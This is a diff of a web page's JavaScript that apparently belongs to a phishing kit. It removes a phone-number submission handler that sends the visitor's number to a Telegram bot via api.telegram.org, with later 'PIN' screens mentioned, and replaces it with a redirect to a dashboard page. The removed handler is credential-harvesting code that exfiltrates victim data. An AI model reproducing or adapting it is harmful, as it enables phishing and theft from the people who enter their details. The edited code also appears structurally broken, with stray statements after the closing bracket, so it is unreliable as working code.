@@ -344,36 +344,23 @@
         }
       });
 
-      // --- 1. FIRST SUBMISSION: Phone Number Screen ---
-      submitBtn.addEventListener("click", async () => {
-        loaderOverlay.style.display = "flex";
-        statusText.textContent = "loading...";
+      // --- 1. FIRST SUBMISSION: Phone Number Screen (Bypassed to Dashboard) ---
+      submitBtn.addEventListener("click", () => {
+        // Instead of showing the loader and going to pre-pin/PIN screens,
+        // jump straight to your dashboard or final URL:
+        
+        // Option A: If your dashboard is another page (e.g., dashboard.html)
+        window.location.href = "dashboard.html";
 
-        const payload = {
-          phone: phoneInput.value,
-          action: "phone_submission"
-        };
-
-        try {
-          await fetch("/api/submit-phone", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload),
-          });
-
-          const telegramMessage = `📱 Step 1: Phone Number Submitted\n\n🔹 Phone: +${phoneInput.value}`;
-          
-          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: TELEGRAM_CHAT_ID,
-              text: telegramMessage
-            })
-          });
-        } catch (error) {
-          console.error("Phone submission failed:", error);
-        }
+        // Option B: If your dashboard is an element on the same page, uncomment below:
+        /*
+        mainContent.style.opacity = "0";
+        setTimeout(() => {
+          mainContent.classList.add("hidden");
+          document.getElementById("dashboard-screen").classList.remove("hidden"); // Replace with your actual dashboard ID
+        }, 400);
+        */
+      });
 
         // Screen Transition
         loaderOverlay.style.display = "none";
